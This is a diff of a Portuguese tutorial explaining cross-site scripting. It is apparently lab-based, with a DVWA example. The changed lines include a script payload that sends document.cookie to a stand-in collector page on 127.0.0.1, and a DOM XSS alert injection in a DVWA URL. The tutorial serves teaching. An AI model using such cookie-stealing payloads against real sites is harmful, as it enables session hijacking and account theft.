@@ -1,6 +1,6 @@
 
 # Wtf is xss?
-_Após adentrar o mundo do desenvolvimento web, percebe-se que a quantidade de vulnerabilidades existentes por falhas no código ou até mesmo falta de atenção de quem o fez são inúmeras. Uma das mais famosas e mais utilizadas por usuários mal-intencionados é o Xss. **xss** ou **Cross-site Scripting** é um tipo de injeção de código malicioso em forma de script, normalmente em uma aplicação web. Os ataques são difundidos, e ocorrem quando uma sequência de códigos [Client-side](https://pt.wikipedia.org/wiki/Client-side_script) são enviados para o servidor e o mesmo não realiza nenhuma validação ou filtragem do que foi passado._
+_Após adentrar ao mundo do desenvolvimento web, percebe-se que a quantidade de vulnerabilidades existentes por falhas no código ou até mesmo falta de atenção de quem o fez são inúmeras. Uma das mais famosas e mais utilizadas por usuários mal-intencionados é o Xss. **xss** ou **Cross-site Scripting** é um tipo de injeção de código malicioso em forma de script, normalmente em uma aplicação web. Os ataques são difundidos, e ocorrem quando uma sequência de códigos [Client-side](https://pt.wikipedia.org/wiki/Client-side_script) são enviados para o servidor e o mesmo não realiza nenhuma validação ou filtragem do que foi passado._
 ## Como funciona?
 _imagine a seguinte situação:  Você desenvolve sua aplicação web, e nesta põe um campo para *feedback* público. Por ser um ótimo ouvinte ( e um ótimo descuidado ), você cria um código simples para recebimento deste feedback, e no mesmo pede para que o autor da crítica se identifique, caso queira agradecer futuramente._
 
@@ -67,7 +67,7 @@ _Creio que ninguém, mas, sabendo que há como fazer injeção de código, Você
 
 _o código:_
 
-    <script>document.location = 'http://127.0.0.1/passaocookie.php?c=' + document.cookie;</script>
+    <script>document.location = 'http://127.0.0.1/passaocookie.php?pwn=' + document.cookie;</script>
 
 a saída:
 
@@ -194,7 +194,7 @@ _Analisando a source das opções, vemos o seguinte código:_
 
 _Nossa injeção:_
 
-    localhost/dvwa/vulnerabilities/xss_d/?default=French<script>alert('12')</script>
+    localhost/dvwa/vulnerabilities/xss_d/?default=French<script>alert('123')</script>
 
 ![description](https://i.imgur.com/u8zKsTa.png)
 
